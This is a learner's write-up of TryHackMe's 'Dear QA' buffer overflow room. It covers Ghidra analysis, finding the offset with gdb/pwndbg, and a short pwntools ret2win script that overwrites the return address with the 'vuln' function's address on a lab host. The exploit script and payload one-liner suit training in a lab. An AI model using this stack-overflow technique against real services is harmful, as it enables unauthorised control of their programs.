### Try Hack Me's Dear QA room buffer overflow notes

This one was super easy compared to others; however, the fun part for me was adding pwndbg so that my gdb output was more useful. I found this neat little addition 
by good old fashioned googling after having used x32dbg. I wanted to see what GUI improvements were out there and this one is great. 

**Tools**
+ ghidra
+ gdb
+ pwndbg
+ Python


This room provides the file for static analysis prior to attempting the room. Running the program, there isn't much to it:

<img width="311" height="75" alt="image" src="https://github.com/user-attachments/assets/ef363e1d-c9c1-4a31-a650-ce87bfd1e4f3" />
<br>
<img width="311" height="103" alt="image" src="https://github.com/user-attachments/assets/f8678f2b-9752-43a7-a2da-a309d01267a6" />


<br>
<br>

First, I used ghidra to take a look inside and in the 'Functions' folder of the Symbol Tree, there is a 'vuln' function. 
That immediately indicates that we have to hit this function to get what we need. Take note of the memory address of this function in the far left column: 0x00400686

<img width="1143" height="402" alt="image" src="https://github.com/user-attachments/assets/f88debf9-cb3f-436d-ae9d-de33e1b25d7f" />

<br>
<br>


Now, I ran the program using gdb (again noting I have pwndbg installed, which runs with it). pwndbg is new to me, but the same gdb commands work to set a breakpoint (break main) or 
continue in the program (continue) or step into functions (stepi). From within pwndbg you can run a cyclic payload, but make sure you're noting the right command as I'm stilling learning!
I used a x32 (eip) vs. x64 (rsp) register value at first:

<img width="634" height="142" alt="image" src="https://github.com/user-attachments/assets/eaddb682-ccef-4de8-a8af-ea150d4c6033" />

<br>
<br>

Still wasn't sure what I was looking at yet with all the pretty colors, but there were a couple of helpful commands that showed me what was in program. I could 
also calculate the offset from gdb / pwndbg:
+ x/32wx $rsp-0x40
+ telescope $rsp 20

The output shows how the cyclic pattern lands. 

<img width="799" height="655" alt="image" src="https://github.com/user-attachments/assets/c1d82227-b3e8-4d57-acc3-763c73935c85" />

<br>
<br>

Again testing the offset to make sure I'm hitting RSP, I ran the following command to see 'BBBBBBBB' in RSP

pwndbg> run <<< $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'B'*8)")

<img width="547" height="528" alt="image" src="https://github.com/user-attachments/assets/311e9662-6a1e-4ff3-b302-eb89ac678837" />

<br>
<br>

Now, I have the memory address and the correct offset, so create a short script to send to the running program:

```python
from pwn import *

target = remote('10.XX.XX.XX', 5700) # change IP
target.recvuntil("What's your name: ") # receive banner

payload = cyclic(40) # generate payload based on offset value
payload += p64(0x400686) # p64 is pwntools shortcut to pack a 64-bit integer

target.sendline(payload)

target.interactive()
```

And here we get the flag:
<br>
<img width="666" height="236" alt="image" src="https://github.com/user-attachments/assets/15290ea4-eb5b-4acb-ab78-67702daa7eed" />




